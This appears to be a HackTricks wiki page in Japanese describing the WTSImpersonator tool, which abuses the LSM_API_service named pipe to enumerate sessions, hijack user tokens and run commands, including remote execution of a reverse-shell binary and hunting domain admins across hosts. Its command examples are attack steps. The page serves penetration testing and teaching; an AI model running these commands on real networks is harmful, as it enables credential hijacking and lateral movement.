{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator**ツールは、**"\\pipe\LSM_API_service"** RPC Named pipeを利用して、ログインしているユーザーを密かに列挙し、彼らのトークンをハイジャックします。これにより、従来のトークンインパーソネーション技術を回避し、ネットワーク内でのシームレスな横移動が可能になります。この技術の革新は、**Omri Baso**に帰属し、彼の作品は[GitHub](https://github.com/OmriBaso/WTSImpersonator)で入手可能です。

### コア機能

ツールは一連のAPI呼び出しを通じて動作します：
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### キーモジュールと使用法

- **ユーザーの列挙**: ツールを使用して、ローカルおよびリモートのユーザー列挙が可能で、いずれのシナリオにもコマンドを使用します。

- ローカルで:
```powershell
.\WTSImpersonator.exe -m enum
```
- リモートで、IPアドレスまたはホスト名を指定することによって:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **コマンドの実行**: `exec` および `exec-remote` モジュールは、機能するために **サービス** コンテキストを必要とします。ローカル実行には、WTSImpersonator 実行可能ファイルとコマンドが必要です。

- ローカルコマンド実行の例:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe を使用してサービスコンテキストを取得できます:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **リモートコマンド実行**: PsExec.exe に似たサービスをリモートで作成およびインストールし、適切な権限で実行を可能にします。

- リモート実行の例:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **ユーザーハンティングモジュール**: 複数のマシンにわたって特定のユーザーをターゲットにし、彼らの資格情報の下でコードを実行します。これは、複数のシステムでローカル管理者権限を持つドメイン管理者をターゲットにするのに特に便利です。
- 使用例:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
